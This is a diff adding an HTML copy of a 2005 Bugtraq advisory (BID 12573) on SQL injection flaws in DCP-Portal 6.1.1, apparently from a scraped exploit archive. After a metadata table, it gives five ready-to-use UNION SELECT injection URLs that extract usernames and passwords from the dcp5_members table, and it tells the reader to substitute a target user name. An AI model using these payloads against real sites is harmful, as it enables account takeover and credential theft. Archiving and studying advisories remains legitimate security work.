@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid12573<p><b><span style="font-size: 18pt;">DCP-Portal Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12573/info">info</a><br><a href="http://www.securityfocus.com/bid/12573/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12573/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12573/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12573/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12573
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these vulnerabilities is credited to Exoduks &lt;www.hackgen.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					DCP-Portal DCP-Portal 6.1.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concepts are available:<br/>http://www.example.com/index.php?page=links&amp;catid=1&amp;lcat=-99%27 UNION SELECT null,password FROM dcp5_members WHERE username=%27username<br/><br/>http://www.example.com/index.php?page=documents&amp;doc=-99%27 UNION SELECT null,null,username,password, null,null,null,null,null,null,null,null FROM dcp5_members WHERE username=%27username<br/><br/>http://www.example.com/index.php?page=mdetails&amp;uid=-99%27 UNION SELECT null,null,null,username,null, null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null FROM dcp5_members WHERE username=%27username<br/><br/>http://server.com/forums.php?action=showmsg&amp;mid=-99%27 UNION SELECT  null,null,null,password,null, username,null,null,null FROM dcp5_members WHERE username=%27username<br/><br/>http://server.com/forums.php?action=board&amp;bid=-99%27UNION SELECT null,null,password,null FROM dcp5_members WHERE username=%27username<br/><br/>Replace username in the above examples with the user name you wish to retrieve the password for.
+	
+		<ul>
+</ul>
+</div>
